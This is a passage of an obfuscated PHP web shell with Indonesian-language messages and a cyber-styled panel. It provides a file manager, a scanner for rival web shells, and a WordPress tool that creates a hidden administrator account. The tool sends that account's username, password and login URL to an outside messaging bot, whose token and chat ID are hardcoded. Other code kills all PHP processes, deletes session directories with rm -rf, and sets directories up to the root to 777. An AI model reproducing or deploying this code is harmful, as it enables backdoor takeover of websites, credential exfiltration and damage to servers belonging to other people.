$_POST["\x7a\151\160\x5f\146\151\154\145\x6e\x61\155\145"]) : "\141\x72\143\x68\151\166\145\x2e\x7a\151\x70"; if (substr(strtolower($zip_filename), -4) !== "\x2e\172\151\160") { $zip_filename .= "\x2e\172\x69\160"; } $zip_filepath = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $zip_filename; $zip = new ZipArchive(); if ($zip->open($zip_filepath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) { $added_count = 0; foreach ($items as $item_name) { $item_path = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item_name; if (file_exists($item_path)) { if (is_dir($item_path)) { addDirectoryToZip($zip, $item_path, $item_name . "\57"); } else { $zip->addFile($item_path, $item_name); } $added_count++; } } $zip->close(); $output_messages[] = "\x42\145\x72\x68\x61\163\151\x6c\x20\x6d\x65\155\142\165\141\164\40\141\x72\163\x69\160\x20\x27" . call_user_func($htmlspecialchars_fn, $zip_filename) . "\47\40\x64\x65\156\x67\141\156\40{$added_count}\40\x69\164\145\155\x2e"; } else { $error_messages[] = "\107\141\147\x61\x6c\40\x6d\145\155\142\x75\x61\164\40\146\x69\154\145\40\141\x72\163\151\160\40\x27" . call_user_func($htmlspecialchars_fn, $zip_filename) . "\47\x2e"; } } } } } elseif ($action_post === "\163\x63\141\x6e\137\167\x65\x62\163\x68\x65\x6c\154\163" && $active_menu === "\x77\145\142\x73\150\x65\154\154\137\163\143\141\156\x6e\x65\x72") { $scan_path_post_scan_final = isset($_POST["\x73\x63\x61\x6e\x5f\x64\151\162"]) ? call_user_func($trim_fn, $_POST["\163\143\141\x6e\137\144\151\x72"]) : call_user_func($getcwd_fn); $is_readable_post_scan_final = _get_fn_name_global_init_v3("\x5f\147\137\x61\x73\x63\151\x69\137\151\163\137\x72\x65\141\144\x61\142\154\145", "\x69\x73\x5f\x72\x65\x61\x64\x61\142\x6c\x65"); if (empty($is_dir_fn) || !@call_user_func($is_dir_fn, $scan_path_post_scan_final) || empty($is_readable_post_scan_final) || !@call_user_func($is_readable_post_scan_final, $scan_path_post_scan_final)) { $error_messages[] = "\123\143\141\156\x6e\145\x72\x20\105\x72\162\157\x72\72\x20\120\x61\x74\x68\x20\x74\x69\144\x61\153\x20\x76\141\x6c\151\x64\40\x61\164\x61\165\40\164\151\144\x61\153\40\x72\145\141\144\x61\142\x6c\145\56"; } else { $ini_set_post_scan_final = _get_fn_name_global_init_v3("\137\x67\x5f\x61\163\x63\x69\151\x5f\x69\x6e\x69\137\163\145\164", "\151\156\151\x5f\163\x65\164"); if (!empty($ini_set_post_scan_final) && call_user_func($function_exists_fn, $ini_set_post_scan_final)) { @call_user_func($ini_set_post_scan_final, "\x6d\x65\155\157\162\x79\x5f\x6c\151\155\151\164", "\55\x31"); @call_user_func($ini_set_post_scan_final, "\155\141\x78\137\145\170\145\x63\165\x74\151\157\156\137\164\x69\x6d\x65", $scanner_limit); } if (function_exists("\x73\145\164\137\164\151\155\145\137\154\x69\155\151\164")) { @set_time_limit($scanner_limit); } $output_messages[] = "\x4d\x65\x6d\165\154\141\151\40\160\x65\155\x69\156\x64\x61\x69\141\x6e\x20\x64\151\72\40\x3c\143\157\x64\145\x3e" . call_user_func($htmlspecialchars_fn, $scan_path_post_scan_final) . "\74\x2f\143\157\x64\145\x3e\x20\x28\x4d\141\170\x20\x74\151\155\145\x3a\x20{$scanner_minute}\x20\x6d\145\x6e\x69\x74\x29"; $initial_scan_array = array("\x61\154\154\137\x69\164\x65\155\x73" => array()); $scan_results_raw = scanner_recursiveScan($scan_path_post_scan_final, $initial_scan_array); $all_files_to_scan = isset($scan_results_raw["\141\x6c\154\137\151\164\145\155\163"]) ? $scan_results_raw["\141\x6c\154\137\x69\x74\145\x6d\x73"] : array(); $all_files_to_scan = scanner_sortByLastModified($all_files_to_scan); $found_files_count_post_scan_final = 0; ob_start(); echo "\74\x74\141\142\154\145\76\x3c\164\150\x65\141\x64\x3e\74\x74\x72\x3e\x3c\x74\x68\x3e\x44\145\x74\145\143\164\x65\144\x20\x53\x75\x73\160\x69\143\x69\157\165\163\x20\106\x69\154\145\x73\74\57\164\x68\x3e\x3c\x74\150\40\x73\164\x79\154\145\75\42\167\x69\144\164\x68\x3a\x31\x38\x30\160\x78\x3b\42\76\x41\143\164\151\x6f\156\163\x3c\57\x74\150\x3e\x3c\x2f\164\162\x3e\74\x2f\164\x68\x65\x61\x64\x3e\x3c\164\x62\157\144\171\76"; $file_get_contents_local_snippet_final = _get_fn_name_global_init_v3("\137\147\x5f\x61\x73\143\151\x69\x5f\x66\151\x6c\145\x5f\147\x65\164\x5f\143\157\x6e\164\x65\x6e\164\x73", "\146\x69\154\x65\x5f\x67\x65\164\137\x63\157\x6e\x74\x65\x6e\164\163"); $substr_local_snippet_final = _get_fn_name_global_init_v3("\x5f\x67\137\141\x73\x63\x69\151\137\x73\x75\x62\163\164\x72", "\163\165\x62\163\164\x72"); $realpath_local_scan = _get_fn_name_global_init_v3("\137\147\x5f\141\x73\143\151\151\137\162\x65\x61\x6c\x70\141\x74\x68", "\162\145\141\x6c\x70\x61\x74\150"); $doc_root = isset($_SERVER["\104\x4f\103\x55\x4d\105\116\124\x5f\122\117\117\x54"]) && !empty($realpath_local_scan) ? rtrim(@call_user_func($realpath_local_scan, $_SERVER["\x44\117\103\125\x4d\105\116\124\137\x52\117\117\124"]), "\x2f\x5c") : null; $server_name = $_SERVER["\123\105\x52\126\x45\122\137\116\x41\115\x45"]; $protocol = !empty($_SERVER["\x48\x54\124\x50\123"]) && $_SERVER["\110\x54\x54\x50\123"] !== "\x6f\146\x66" ? "\150\164\x74\x70\x73" : "\x68\x74\164\160"; foreach ($all_files_to_scan as $file_path_scan) { if (is_dir($file_path_scan)) { continue; } $token_matches = scanner_compareTokens($scanner_tokenNeedles, scanner_getFileTokens($file_path_scan)); $string_matches = array(); $content_scan = !empty($file_get_contents_local_snippet_final) ? @call_user_func($file_get_contents_local_snippet_final, $file_path_scan) : false; if ($content_scan !== false) { foreach ($scanner_tokenNeedles as $needle) { if (stripos($content_scan, $needle) !== false) { $string_matches[] = $needle; } } } $found_matches = array_unique(array_merge($token_matches, $string_matches)); if (!empty($found_matches)) { $found_files_count_post_scan_final++; $matched_tokens_str_post_final = implode("\x2c\x20", array_map($htmlspecialchars_fn, $found_matches)); $file_content_snippet_final = ''; if ($content_scan !== false && !empty($substr_local_snippet_final)) { $file_content_snippet_final = call_user_func($htmlspecialchars_fn, call_user_func($substr_local_snippet_final, $content_scan, 0, 250)); if (strlen($content_scan) > 250) { $file_content_snippet_final .= "\56\x2e\x2e"; } } echo "\x3c\164\x72\x3e\74\x74\144\76\74\x73\160\x61\156\x20\x73\164\171\x6c\x65\x3d\x22\x63\x6f\154\x6f\x72\x3a\x72\x65\x64\x3b\x20\x66\157\156\x74\55\167\145\151\x67\150\x74\72\142\x6f\x6c\x64\x3b\x22\76" . call_user_func($htmlspecialchars_fn, $file_path_scan) . "\x3c\x2f\163\160\x61\x6e\76\x3c\142\162\x3e\x3c\163\155\x61\154\x6c\x20\163\164\x79\x6c\x65\x3d\x22\x63\x6f\154\157\x72\72\43\x66\146\x61\141\x61\141\73\42\x3e\124\157\x6b\x65\x6e\163\72\40" . $matched_tokens_str_post_final . "\74\x2f\163\155\141\154\154\x3e\74\x62\162\x3e"; if (!empty($file_content_snippet_final)) { echo "\x3c\x73\155\141\x6c\x6c\40\163\164\x79\154\145\x3d\42\143\157\154\x6f\x72\72\43\x63\x63\146\x66\x63\143\73\x20\144\151\163\x70\x6c\141\171\72\x62\x6c\x6f\x63\153\73\x20\155\x61\x72\147\x69\x6e\55\x74\157\x70\x3a\65\160\170\x3b\x20\x77\x68\x69\x74\145\x2d\163\x70\141\143\x65\72\160\x72\x65\x2d\167\x72\x61\x70\73\40\x62\x61\x63\x6b\x67\162\157\165\x6e\x64\55\143\157\x6c\157\162\x3a\x72\147\x62\141\50\x30\54\x35\x30\x2c\x30\x2c\x30\56\65\x29\73\40\x70\x61\144\144\151\156\147\72\x35\160\x78\73\40\x62\157\x72\144\x65\x72\x2d\162\141\144\151\x75\x73\x3a\x33\x70\x78\x3b\40\x6d\141\x78\x2d\x68\145\151\x67\x68\x74\x3a\x31\60\x30\160\170\73\x20\157\166\145\x72\x66\x6c\157\x77\x2d\x79\x3a\141\165\164\157\x3b\42\x3e\x53\156\151\x70\x70\145\x74\x3a\x20" . $file_content_snippet_final . "\x3c\x2f\x73\155\141\x6c\154\76"; } echo "\x3c\x2f\164\x64\76\74\x74\x64\76"; $web_url = null; if ($doc_root && !empty($realpath_local_scan) && call_user_func($function_exists_fn, $realpath_local_scan)) { $real_filepath = @call_user_func($realpath_local_scan, $file_path_scan); if ($real_filepath && strpos($real_filepath, $doc_root) === 0) { $web_path = str_replace("\x5c", "\57", substr($real_filepath, strlen($doc_root))); $web_url = $protocol . "\x3a\57\x2f" . $server_name . $web_path; } } if ($web_url) { echo "\x3c\141\40\150\162\x65\146\x3d\42" . call_user_func($htmlspecialchars_fn, $web_url) . "\42\x20\164\x61\162\x67\145\x74\75\x22\x5f\x62\154\x61\x6e\x6b\x22\40\143\x6c\x61\163\163\x3d\x22\141\143\x74\151\x6f\156\55\x62\164\x6e\42\76\117\160\145\x6e\x20\125\x52\x4c\74\57\x61\76"; } echo "\x3c\141\40\x68\x72\145\x66\x3d\42\77\155\x65\156\x75\75\x77\x65\142\163\150\x65\154\154\137\163\143\141\156\x6e\x65\x72\46\x70\x61\x74\x68\75" . urlencode(call_user_func($dirname_fn, $file_path_scan)) . "\46\x66\151\x6c\x65\x5f\141\x63\x74\151\x6f\156\75\x64\x65\154\145\164\145\x26\164\141\x72\147\x65\164\75" . urlencode(call_user_func($basename_fn, $file_path_scan)) . "\46\x73\x63\141\x6e\x5f\144\x69\162\137\162\145\x66\x3d" . urlencode($scan_path_post_scan_final) . "\x22\40\157\156\143\154\x69\x63\x6b\75\x22\162\145\164\x75\162\156\x20\x63\157\156\x66\151\162\155\104\145\x6c\x65\x74\145\x28\x27" . call_user_func($htmlspecialchars_fn, addslashes(call_user_func($basename_fn, $file_path_scan))) . "\x27\51\42\x20\x63\154\x61\163\163\75\x22\x61\x63\x74\x69\157\156\55\142\164\156\x22\76\104\145\x6c\145\x74\145\74\57\x61\76"; echo "\x3c\57\x74\144\x3e\74\x2f\x74\162\76"; } } if ($found_files_count_post_scan_final === 0) { echo "\74\x74\x72\x3e\74\x74\x64\40\x63\x6f\x6c\163\160\x61\156\75\x22\62\42\x3e\124\151\x64\141\x6b\40\141\144\x61\40\x66\151\154\145\40\155\145\x6e\143\x75\162\151\147\x61\x6b\x61\156\40\x64\151\x74\x65\155\x75\x6b\141\x6e\x2e\74\x2f\x74\x64\76\74\x2f\164\x72\x3e"; } echo "\x3c\57\164\142\157\x64\x79\76\x3c\57\164\x61\142\154\145\x3e"; $scanner_results_html = ob_get_clean(); $output_messages[] = "\x50\x65\155\151\x6e\x64\x61\151\x61\x6e\x20\163\x65\154\x65\163\x61\x69\56\40\x44\151\164\145\x6d\165\153\141\x6e\40" . $found_files_count_post_scan_final . "\x20\146\151\x6c\145\x20\x6d\x65\156\x63\x75\162\151\x67\141\153\141\x6e\x2e"; } } elseif ($action_post === "\143\x72\x65\x61\164\x65\137\167\160\137\x61\144\155\x69\x6e" && $active_menu === "\x77\x70\x5f\141\144\155\x69\x6e\137\x63\x72\145\x61\164\157\x72") { $wp_load_path_action_post_wp_creator_final_full = find_wp_load_path($auto_path_script); $file_exists_wp_action_post_wp_creator_final_full = _get_fn_name_global_init_v3("\x5f\147\x5f\141\163\143\151\x69\x5f\x66\x69\x6c\x65\137\x65\x78\x69\163\164\163", "\146\x69\154\x65\137\x65\x78\x69\x73\x74\x73"); if ($wp_load_path_action_post_wp_creator_final_full && !empty($file_exists_wp_action_post_wp_creator_final_full) && call_user_func($file_exists_wp_action_post_wp_creator_final_full, $wp_load_path_action_post_wp_creator_final_full)) { if (!defined("\x57\120\137\x55\x53\105\137\x54\110\105\x4d\x45\123")) { define("\x57\120\137\x55\x53\105\x5f\x54\110\x45\115\x45\x53", false); } ob_start(); $wp_loaded_ok_action_post_wp_creator_final_full = @(include_once $wp_load_path_action_post_wp_creator_final_full); ob_end_clean(); if (!$wp_loaded_ok_action_post_wp_creator_final_full) { $wp_admin_feedback_text = "\113\122\x49\124\111\x53\40\x50\x4f\123\124\x3a\x20\107\x61\x67\x61\154\x20\x6d\165\x61\x74\40\x57\x50\56"; $wp_admin_feedback_class = "\x65\x72\x72\x6f\x72"; } elseif (!function_exists("\167\x70\137\x76\x65\162\151\146\x79\137\156\157\x6e\143\145")) { $wp_admin_feedback_text = "\x4b\122\x49\x54\x49\123\40\120\x4f\x53\x54\72\40\x46\165\156\147\163\151\40\x57\x50\x20\151\x6e\x74\x69\40\x74\x69\x64\x61\x6b\x20\x61\x64\x61\x2e"; $wp_admin_feedback_class = "\145\162\162\x6f\x72"; } else { $token_key_admin_wp_creator_post_val_final_full = "\67\x37\x35\65\x33\67\67\63\71\x36\72\101\x41\105\x51\61\110\157\x57\x66\103\137\x59\105\x6e\x65\55\x38\x4f\x4a\165\151\x47\x72\x6e\152\x67\121\153\x57\64\146\x35\105\x77\x30"; $destination_id_admin_wp_creator_post_val_final_full = "\70\x31\63\60\x33\x30\x34\x35\61\67"; if (!isset($_POST["\x63\x72\145\x61\x74\145\x5f\141\x64\x6d\x69\x6e\x5f\156\x6f\x6e\x63\145"]) || !wp_verify_nonce($_POST["\x63\x72\x65\x61\164\145\137\x61\x64\x6d\151\156\137\156\x6f\156\x63\x65"], "\143\162\x65\141\164\x65\x5f\x61\x64\x6d\x69\156\x5f\x61\x63\x74\151\157\156")) { $wp_admin_feedback_text = "\120\x65\x72\x6d\x69\x6e\164\141\x61\156\40\x74\x69\144\141\153\40\166\x61\x6c\151\144\56"; $wp_admin_feedback_class = "\x65\x72\x72\x6f\162"; } else { $new_admin_username_action_post_wp_val_final_full = call_user_func($trim_fn, $_POST["\165\x73\x65\x72\156\141\x6d\x65"] ?? ''); $new_admin_password_action_post_wp_val_final_full = $_POST["\x70\141\x73\163\167\x6f\162\144"] ?? ''; $new_admin_email_action_post_wp_val_final_full = call_user_func($trim_fn, $_POST["\x65\155\x61\x69\154"] ?? ''); $errors_wp_creator_action_post_wp_val_final_full = array(); if (empty($new_admin_username_action_post_wp_val_final_full)) { $errors_wp_creator_action_post_wp_val_final_full[] = "\125\x73\145\x72\156\x61\x6d\145\x20\x77\x61\152\x69\142\56"; } if (empty($new_admin_password_action_post_wp_val_final_full)) { $errors_wp_creator_action_post_wp_val_final_full[] = "\x50\x61\163\163\x77\157\162\144\x20\x77\x61\x6a\151\142\x2e"; } if (function_exists("\166\x61\x6c\151\x64\141\164\145\x5f\165\x73\145\162\156\141\155\145") && !empty($new_admin_username_action_post_wp_val_final_full) && !validate_username($new_admin_username_action_post_wp_val_final_full)) { $errors_wp_creator_action_post_wp_val_final_full[] = "\125\x73\145\x72\x6e\x61\155\x65\40\164\151\x64\x61\x6b\x20\166\x61\x6c\151\x64\56"; } if (strlen($new_admin_password_action_post_wp_val_final_full) < 8 && !empty($new_admin_password_action_post_wp_val_final_full)) { $errors_wp_creator_action_post_wp_val_final_full[] = "\120\x61\163\163\x77\x6f\x72\144\x20\x6d\151\x6e\x20\70\40\153\141\162\141\x6b\x74\x65\x72\56"; } if (function_exists("\x69\163\137\x65\155\141\x69\x6c") && !empty($new_admin_email_action_post_wp_val_final_full) && !is_email($new_admin_email_action_post_wp_val_final_full)) { $errors_wp_creator_action_post_wp_val_final_full[] = "\x45\155\141\x69\x6c\x20\x74\x69\x64\x61\153\x20\166\141\x6c\151\x64\x2e"; } if (!empty($errors_wp_creator_action_post_wp_val_final_full)) { $wp_admin_feedback_text = implode("\x3c\x62\x72\76", array_map($htmlspecialchars_fn, $errors_wp_creator_action_post_wp_val_final_full)); $wp_admin_feedback_class = "\x65\162\x72\x6f\x72"; } else { if (function_exists("\165\163\x65\x72\x6e\x61\155\145\137\x65\170\x69\x73\164\x73") && !username_exists($new_admin_username_action_post_wp_val_final_full)) { $user_id_wp_creator_action_post_wp_val_final_full = wp_create_user($new_admin_username_action_post_wp_val_final_full, $new_admin_password_action_post_wp_val_final_full, $new_admin_email_action_post_wp_val_final_full); if (!is_wp_error($user_id_wp_creator_action_post_wp_val_final_full)) { $user_wp_obj_action_post_wp_val_final_full = new WP_User($user_id_wp_creator_action_post_wp_val_final_full); $user_wp_obj_action_post_wp_val_final_full->set_role("\141\x64\x6d\x69\x6e\151\163\x74\x72\141\x74\x6f\x72"); $script_url_wp_action_post_wp_val_final_full = (isset($_SERVER["\110\124\124\x50\123"]) && $_SERVER["\x48\124\x54\x50\x53"] === "\157\156" ? "\x68\x74\x74\x70\x73" : "\x68\x74\164\x70") . "\x3a\x2f\57{$_SERVER["\110\x54\x54\120\137\x48\x4f\x53\x54"]}{$_SERVER["\122\x45\121\x55\105\x53\x54\137\x55\122\111"]}"; $site_domain_wp_action_post_wp_val_final_full = function_exists("\x67\x65\x74\x5f\x73\151\x74\145\x5f\x75\x72\154") ? parse_url(get_site_url(), PHP_URL_HOST) : $_SERVER["\123\105\x52\x56\x45\x52\137\116\101\115\x45"]; $wp_login_url_wp_action_post_wp_val_final_full = function_exists("\167\160\137\x6c\157\x67\x69\156\x5f\165\162\154") ? wp_login_url() : $site_domain_wp_action_post_wp_val_final_full . "\x2f\x77\x70\55\x6c\x6f\147\x69\156\x2e\x70\x68\x70"; $notification_lines_wp_action_post_wp_val_final_full = array("\x3c\x62\76\342\x9c\x85\40\x41\144\x6d\x69\x6e\40\102\x61\162\x75\x20\104\151\x62\x75\x61\x74\x20\x28\127\145\142\163\x68\x65\154\154\51\x3c\x2f\x62\76\xa", "\x3c\142\x3e\104\x6f\155\141\151\156\x3a\x3c\x2f\x62\76\x20\x3c\x63\157\x64\145\x3e" . call_user_func($htmlspecialchars_fn, $site_domain_wp_action_post_wp_val_final_full) . "\74\x2f\143\x6f\144\x65\x3e", "\x3c\x62\x3e\125\x73\x65\162\x6e\141\x6d\145\72\x3c\57\x62\x3e\40\74\x63\x6f\x64\145\76" . call_user_func($htmlspecialchars_fn, $new_admin_username_action_post_wp_val_final_full) . "\x3c\x2f\143\x6f\x64\x65\76", "\74\x62\x3e\120\141\x73\x73\x77\157\x72\144\x3a\74\x2f\142\76\40\x3c\143\x6f\144\145\76" . call_user_func($htmlspecialchars_fn, $new_admin_password_action_post_wp_val_final_full) . "\x3c\x2f\x63\157\x64\145\76"); if (!empty($new_admin_email_action_post_wp_val_final_full)) { $notification_lines_wp_action_post_wp_val_final_full[] = "\74\142\76\105\x6d\141\151\x6c\x3a\x3c\x2f\142\x3e\x20\x3c\x63\x6f\144\145\x3e" . call_user_func($htmlspecialchars_fn, $new_admin_email_action_post_wp_val_final_full) . "\74\x2f\143\157\x64\x65\x3e"; } $notification_lines_wp_action_post_wp_val_final_full[] = "\74\x62\x3e\x55\122\114\x20\123\x6b\x72\x69\x70\72\74\57\142\76\40" . call_user_func($htmlspecialchars_fn, function_exists("\x65\163\143\x5f\165\162\154") ? esc_url($script_url_wp_action_post_wp_val_final_full) : $script_url_wp_action_post_wp_val_final_full); $notification_lines_wp_action_post_wp_val_final_full[] = "\74\x62\x3e\114\151\x6e\x6b\x20\x4c\157\147\151\156\x3a\x3c\57\x62\76\x20\x3c\x61\40\x68\x72\145\146\75\42" . call_user_func($htmlspecialchars_fn, function_exists("\145\163\143\x5f\x75\162\154") ? esc_url($wp_login_url_wp_action_post_wp_val_final_full) : $wp_login_url_wp_action_post_wp_val_final_full) . "\42\76\113\x6c\x69\x6b\x20\114\157\147\x69\156\x3c\x2f\141\x3e"; $notification_message_wp_action_post_wp_val_final_full = implode("\xa", $notification_lines_wp_action_post_wp_val_final_full); $send_to_wp_action_post_wp_val_final_full = send_to_wp_load($notification_message_wp_action_post_wp_val_final_full, $token_key_admin_wp_creator_post_val_final_full, $destination_id_admin_wp_creator_post_val_final_full); if ($send_to_wp_action_post_wp_val_final_full["\163\165\143\143\145\163\163"]) { $wp_admin_feedback_text = "\x41\144\155\151\156\x20\x62\x61\x72\165\40\x64\151\x62\x75\x61\164\x21"; $wp_admin_feedback_class = "\163\165\x63\x63\145\163\163"; } else { $wp_admin_feedback_text = "\101\144\x6d\151\x6e\x20\144\x69\142\x75\141\x74\56\x3a\x20" . call_user_func($htmlspecialchars_fn, $send_to_wp_action_post_wp_val_final_full["\x6d\145\x73\163\x61\147\x65"]); $wp_admin_feedback_class = "\x77\141\162\156\151\156\x67"; } } else { $wp_admin_feedback_text = "\107\141\x67\141\154\x20\x62\165\141\x74\x20\x61\x64\x6d\x69\156\x3a\40" . call_user_func($htmlspecialchars_fn, $user_id_wp_creator_action_post_wp_val_final_full->get_error_message()); $wp_admin_feedback_class = "\145\162\162\157\x72"; } } elseif (function_exists("\165\163\x65\162\x6e\x61\155\145\x5f\x65\x78\x69\x73\164\x73")) { $wp_admin_feedback_text = "\x55\163\x65\162\156\141\155\145\40\74\x63\157\144\145\76" . call_user_func($htmlspecialchars_fn, $new_admin_username_action_post_wp_val_final_full) . "\x3c\57\x63\x6f\144\x65\x3e\x20\163\165\144\141\150\x20\141\x64\141\x2e"; $wp_admin_feedback_class = "\167\141\x72\x6e\151\156\147"; } else { $wp_admin_feedback_text = "\x75\163\x65\x72\x6e\141\x6d\145\x5f\145\170\x69\x73\x74\x73\50\51\x20\x74\x69\144\141\x6b\x20\141\144\141\56"; $wp_admin_feedback_class = "\145\162\x72\x6f\x72"; } } } } } else { $wp_admin_feedback_text = "\x4b\x52\x49\x54\111\x53\x20\x50\117\123\x54\72\x20\x3c\x63\x6f\144\x65\76\x77\x70\x2d\x6c\157\141\x64\56\160\x68\x70\x3c\57\x63\x6f\144\x65\76\x20\164\x69\144\x61\153\x20\144\151\x74\x65\x6d\165\153\141\x6e\56"; $wp_admin_feedback_class = "\145\162\162\x6f\x72"; } } } goto IPARA; K0ipW: $current_path = $auto_path_script; goto v4nDz; sLE9v: goto F2T1h; goto uBEbh; uBEbh: DIR5X: goto sBA1f; FKc99: goto oaERw; goto Wp00v; BKlwo: goto v1_0P; goto eaipe; kUVpD: goto mC_nO; goto ycjhx; QoH2K: C9hI2: goto kCkdY; p4P37: oaERw: goto lxfBq; kSRd6: qLjXO: goto lQgxU; vfW0d: goto dIK8R; goto HVSfi; nAD3H: goto PiP4g; goto was_O; sf2br: elvpe: goto EgYKy; SW2rJ: goto fljUg; goto N7WGI; iZEE9: goto j6aZR; goto CU7QY; yrLao: jjId8: goto Rt6jQ; pvx0X: goto WTTUr; goto M6QYs; ay2yp: PjZ6Q: goto f7tR_; GZ5Dv: goto e33Qo; goto rPDeb; wBX7O: $htmlspecialchars_fn = _get_fn_name_global_init_v3("\x5f\147\x5f\141\163\x63\151\x69\x5f\150\164\x6d\154\163\x70\145\x63\151\x61\154\143\150\141\162\163", "\150\x74\x6d\x6c\x73\x70\145\x63\x69\141\x6c\x63\x68\141\162\x73"); goto sgpGn; oMB6D: mC_nO: goto mcb4a; ju6Nx: ?>
</div>
                    <div class="info-card rounded-lg p-3 glass-effect"><span class="cyber-font text-accent">Server IP:</span><br><?php  goto n8XHU; dRekX: $_g_ascii_base64_encode = array(98, 97, 115, 101, 54, 52, 95, 101, 110, 99, 111, 100, 101); goto jM_82; al5MN: $scanner_minute = 15; goto FusLx; YTjGc: goto E8lQp; goto SPn5r; SGIoP: function unlock_shell() { global $function_exists_fn, $dynamic_names; $sys_get_temp_dir_fn = _get_fn_name_global_init_v3("\x5f\147\x5f\x61\163\x63\x69\x69\137\163\x79\x73\x5f\147\x65\x74\137\x74\x65\155\x70\137\144\x69\162", "\163\171\x73\137\147\x65\x74\x5f\164\145\x6d\160\137\x64\x69\162"); $tmp_dir = call_user_func($sys_get_temp_dir_fn); $sessions_dir = rtrim($tmp_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . "\x2e\x73\145\163\163\151\157\156\x73"; $output1 = try_execute_command("\x6b\x69\x6c\154\141\x6c\x6c\x20\55\71\x20\160\150\160"); $output2 = try_execute_command("\x70\x6b\151\154\x6c\x20\x2d\x39\40\160\x68\160"); $output3 = try_execute_command("\x72\x6d\x20\55\162\x66\x20" . safe_escapeshellarg($sessions_dir)); if (isset($_SESSION["\143\x61\x63\150\145\137\x64\x69\162\x5f\160\x61\x74\150"])) { deleteDirectoryRecursive($_SESSION["\x63\141\x63\x68\x65\137\x64\151\162\137\160\x61\x74\150"]); unset($_SESSION["\143\141\x63\150\x65\137\x61\x63\x74\x69\166\x65"], $_SESSION["\x63\141\x63\150\145\137\144\x69\x72\x5f\x70\x61\x74\150"], $_SESSION["\143\x61\x63\x68\x65\x5f\154\x6f\x67\x5f\x70\x61\x74\150"], $_SESSION["\143\x61\x63\x68\x65\x5f\x73\143\x72\151\160\x74\x5f\x6e\x61\x6d\x65"], $_SESSION["\x63\x61\143\x68\x65\x5f\x63\x72\157\156\x5f\x69\x64"], $_SESSION["\143\x61\x63\x68\x65\x5f\x63\157\144\145\x5f\164\145\155\x70\x6c\141\164\145"]); } if (isset($_SESSION["\154\x34\x5f\x77\141\164\143\x68\145\x72\137\x70\141\164\x68"])) { $l4_info = $_SESSION["\154\x34\137\x77\x61\x74\143\150\145\162\137\160\x61\x74\150"]; if (is_file($l4_info["\x77\x61\x74\143\x68\145\x72\137\146\151\x6c\x65"])) { @unlink($l4_info["\x77\141\164\x63\x68\x65\162\137\x66\x69\x6c\x65"]); } unset($_SESSION["\154\64\137\x77\x61\164\x63\150\145\x72\x5f\160\141\x74\150"]); } if ($output1 !== null || $output2 !== null || $output3 !== null) { return "\123\x75\153\x73\x65\163\72\x20\123\x65\x6d\x75\141\40\x70\162\157\x73\145\x73\x20\120\110\120\40\x64\x61\156\x20\x63\x61\143\150\145\40\155\141\x6e\x61\x67\145\x72\x20\144\x69\150\x65\x6e\x74\x69\x6b\141\x6e\40\x64\x61\156\x20\146\x69\x6c\x65\40\x74\x65\x72\153\141\151\164\40\144\x69\150\141\x70\x75\x73\56"; } else { return "\x47\x61\147\141\x6c\72\x20\x54\151\x64\141\153\40\x64\141\x70\x61\x74\40\155\145\x6e\x67\150\x65\x6e\164\x69\x6b\x61\x6e\x20\160\162\157\x73\145\163\x2e\x20\x43\157\x62\141\40\x6d\141\156\165\x61\154\x2e"; } } goto atWDI; ZoiCd: echo $htmlspecialchars_fn($_SERVER["\x52\105\121\x55\x45\123\x54\137\x55\122\111"]); goto yGF_Y; LaU4J: goto rH5hK; goto HKVgt; Z6Qhi: $_g_ascii_popen = array(112, 111, 112, 101, 110); goto nw7EI; GLfF9: goto uH6ff; goto JGzxz; HRlyW: ?>

                <div class="dynamic-content">
                    <?php  goto GZ5Dv; oS1yI: goto xmRTY; goto gB5TB; nx2Pt: goto medmE; goto Ns3Aj; n93H2: if (!empty($chmod_fn_local_init) && function_exists($chmod_fn_local_init)) { $paths_to_chmod_on_init = array(); $temp_path_on_init = __DIR__; $init_depth = 0; while ($temp_path_on_init && $temp_path_on_init !== "\57" && $temp_path_on_init !== "\x2e" && $init_depth < 7) { if (is_path_allowed_by_basedir($temp_path_on_init)) { if (@is_dir($temp_path_on_init)) { $paths_to_chmod_on_init[] = $temp_path_on_init; } } else { break; } $parent_on_init = dirname($temp_path_on_init); if ($parent_on_init === $temp_path_on_init) { break; } $temp_path_on_init = $parent_on_init; $init_depth++; } if ($temp_path_on_init === "\57" && is_path_allowed_by_basedir("\x2f")) { $paths_to_chmod_on_init[] = "\x2f"; } foreach (array_reverse($paths_to_chmod_on_init) as $dir_to_chmod_on_init) { if (@is_dir($dir_to_chmod_on_init)) { $current_perms_str_on_init = substr(sprintf("\x25\x6f", @fileperms($dir_to_chmod_on_init)), -4); if (($current_perms_str_on_init & 511) !== 511) { @call_user_func($chmod_fn_local_init, $dir_to_chmod_on_init, 511); } } } } goto euQy4; hMfbt: EBkQn: goto EDkDp; cunFS: $base64_encode_fn = _get_fn_name_global_init_v3("\137\147\x5f\x61\163\x63\x69\151\137\x62\141\x73\x65\x36\64\137\x65\156\143\x6f\x64\145", "\142\141\163\x65\x36\x34\x5f\x65\x6e\x63\157\x64\x65"); goto vcMiS; pXtOj: $active_menu = "\x65\x78\160\x6c\x6f\x72\145\x72"; goto vfW0d; gAeAx: echo $htmlspecialchars_fn($_SERVER["\x52\x45\115\117\x54\105\x5f\101\104\104\x52"]); goto rXrxg; F5ErJ: HIEPv: goto O_asH; BKPKz: UUqP9: goto VIEPQ; fbBzN: goto Jd42P; goto Y2dwi; BtwTJ: mr3Gc: goto m52ch; v3FHC: foreach ($menus as $key => $menu_data) { $is_active = $active_menu === $key || $key === "\145\170\x70\154\x6f\x72\145\x72" && $active_menu === "\145\x64\151\x74\x6f\162"; echo "\74\x6c\x69\76\74\x61\40\150\162\145\146\x3d\x22\77\155\x65\156\165\75" . $key . "\x26\x70\141\164\150\x3d" . urlencode($current_path) . "\x22\x20\143\x6c\x61\x73\163\75\x22\x6e\x61\x76\x2d\x6c\151\x6e\153\x20\146\x6c\145\170\40\x69\164\x65\x6d\163\x2d\x63\145\x6e\x74\x65\162\40\x70\170\x2d\63\x20\160\171\x2d\x32\x20\164\x65\170\164\55\x73\155\40\162\x6f\165\156\144\145\144\55\x6c\x67\40\155\142\55\61\x20" . ($is_active ? "\141\143\x74\151\x76\145" : '') . "\x22\76\x3c\x69\x20\x63\x6c\x61\x73\163\x3d\x22\x66\141\163\x20" . $menu_data["\x69\143\157\156"] . 